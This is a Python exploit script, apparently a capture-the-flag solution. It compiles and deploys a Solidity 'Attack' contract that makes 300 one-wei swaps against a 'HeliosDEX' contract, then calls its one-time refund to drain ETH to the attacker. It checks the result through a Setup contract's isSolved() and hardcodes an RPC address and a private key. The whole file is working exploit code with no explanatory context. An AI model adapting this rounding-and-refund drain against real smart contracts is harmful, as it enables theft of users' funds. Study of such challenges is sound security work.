from web3 import Web3
from solcx import install_solc, compile_files

# Config
RPC_URL = "http://94.237.50.226:47300"
PRIVATE_KEY = "0x4686f836350e519117f6e9c7462fecfae68c0c2d6b979d39d9979e15bcad05e0"
TARGET_ADDRESS = "0x915cd065EaD6043C6AD65576777fC6311a8DeffD"
SETUP_ADDRESS = "0xD1F80ebC44eD8c5166834252DFA68e81F1f79D76"
PLAYER_ADDRESS = "0x409d7717754Bf8C1dFf498eE87A559b90D19078c"

# Compile contract
install_solc('0.8.28')
attack_code = '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IHeliosDEX {
    function swapForHLS() external payable;
    function oneTimeRefund(address item, uint256 amount) external;
}

interface IHeliosLuminaShards {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Attack {
    IHeliosDEX public immutable dex;
    IHeliosLuminaShards public immutable hls;
    address payable private owner;
    
    constructor(address dexAddress, address hlsAddress) {
        dex = IHeliosDEX(dexAddress);
        hls = IHeliosLuminaShards(hlsAddress);
        owner = payable(msg.sender);
    }
    
    function attack(uint256 times) external payable {
        require(msg.value == times * 1 wei, "Incorrect ETH");
        
        // Split into small chunks
        for(uint i=0; i<times; i++) {
            dex.swapForHLS{value: 1 wei}();
        }
        
        uint balance = hls.balanceOf(address(this));
        hls.approve(address(dex), balance);
        dex.oneTimeRefund(address(hls), balance);
        owner.transfer(address(this).balance);
    }
    
    receive() external payable {}
}
'''

with open("Attack.sol", "w") as f:
    f.write(attack_code)

compiled = compile_files(["Attack.sol"], solc_version="0.8.28", output_values=["abi", "bin"])
attack_abi = compiled['Attack.sol:Attack']['abi']
attack_bytecode = compiled['Attack.sol:Attack']['bin']

# Web3 setup
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVATE_KEY)
print(f"Player: {account.address}")

# Get HLS address
dex = w3.eth.contract(
    address=TARGET_ADDRESS,
    abi=[{"inputs":[],"name":"heliosLuminaShards","outputs":[{"internalType":"contract HeliosLuminaShards","name":"","type":"address"}],"stateMutability":"view","type":"function"}]
)
HLS_ADDRESS = dex.functions.heliosLuminaShards().call()

# Deploy attacker
Attack = w3.eth.contract(abi=attack_abi, bytecode=attack_bytecode)
tx = Attack.constructor(TARGET_ADDRESS, HLS_ADDRESS).build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 3000000,
    'gasPrice': w3.eth.gas_price
})
signed = account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
attacker_address = tx_receipt['contractAddress']
print(f"Attacker deployed: {attacker_address}")

# Run exploit (300 swaps)
attacker = w3.eth.contract(address=attacker_address, abi=attack_abi)
tx = attacker.functions.attack(300).build_transaction({
    'from': account.address,
    'value': 300,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 10000000,  # High gas limit
    'gasPrice': w3.eth.gas_price
})
signed = account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Exploit status: {'Success' if tx_receipt.status else 'Failed'}")

# Verify
setup_abi = [{"inputs":[],"name":"isSolved","outputs":[{"type":"bool"}],"stateMutability":"view","type":"function"}]
setup = w3.eth.contract(address=SETUP_ADDRESS, abi=setup_abi)
print(f"Solved: {setup.functions.isSolved().call()}")
